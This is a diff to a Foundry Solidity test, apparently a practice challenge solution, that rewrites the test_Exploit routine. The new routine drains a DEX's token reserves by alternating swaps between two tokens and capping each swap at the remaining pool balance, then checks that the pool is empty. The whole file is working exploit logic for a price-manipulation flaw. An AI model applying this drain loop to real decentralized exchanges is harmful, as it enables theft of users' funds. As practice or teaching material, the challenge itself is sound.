@@ -34,24 +34,28 @@ contract DexTest is Test {
 
     function test_Exploit() public {
        //Execute the attacker here.
-       vm.startPrank(attacker);
-       for(uint i = 0; i < 1000; i++) {
-        if (swappabletoken1.balanceOf(address(dex)) > 0){
-            swappabletoken2.approve(address(dex), swappabletoken2.balanceOf(attacker));
-            swappabletoken1.approve(address(dex), swappabletoken1.balanceOf(attacker));
+       
+        vm.startPrank(attacker);
+        dex.approve(address(dex), type(uint256).max);
 
-            dex.swap(address(swappabletoken2), address(swappabletoken1), swappabletoken2.balanceOf(attacker));
-            dex.swap(address(swappabletoken1), address(swappabletoken2), swappabletoken1.balanceOf(attacker));
-        } else {
-            break;
+        while (swappabletoken1.balanceOf(address(dex)) > 0) {
+            if(swappabletoken1.balanceOf(attacker) > 0) {
+                uint256 attackerBal = swappabletoken1.balanceOf(attacker);
+                uint256 leftInDex = swappabletoken1.balanceOf(address(dex));
+                uint256 swapAmt = attackerBal > leftInDex ? leftInDex : attackerBal;
+                dex.swap(address(swappabletoken1), address(swappabletoken2), swapAmt);
+            } else { uint256 attackerBal = swappabletoken2.balanceOf(attacker);
+                uint256 leftInDex = swappabletoken2.balanceOf(address(dex));
+                uint256 swapAmt = attackerBal > leftInDex ? leftInDex : attackerBal;
+                dex.swap(address(swappabletoken2), address(swappabletoken1), swapAmt);
+            }
+
+            console.log("Attacker balance of token1: ", swappabletoken1.balanceOf(attacker));
+            console.log("Attacker balance of token2: ", swappabletoken2.balanceOf(attacker));
+            console.log("Dex balance of token1: ", swappabletoken1.balanceOf(address(dex)));
+            console.log("Dex balance of token2: ", swappabletoken2.balanceOf(address(dex)));
         }
-           
-       }
-
-       console.log("Token1 dex balance: ", swappabletoken1.balanceOf(address(dex)));
-       console.log("Token1 attacker balance: ", swappabletoken1.balanceOf(attacker));
-       console.log("Token2 dex balance: ", swappabletoken2.balanceOf(address(dex)));
-       console.log("Token2 attacker balance: ", swappabletoken2.balanceOf(attacker));
+        vm.stopPrank();
        
         is_Drained();
     }
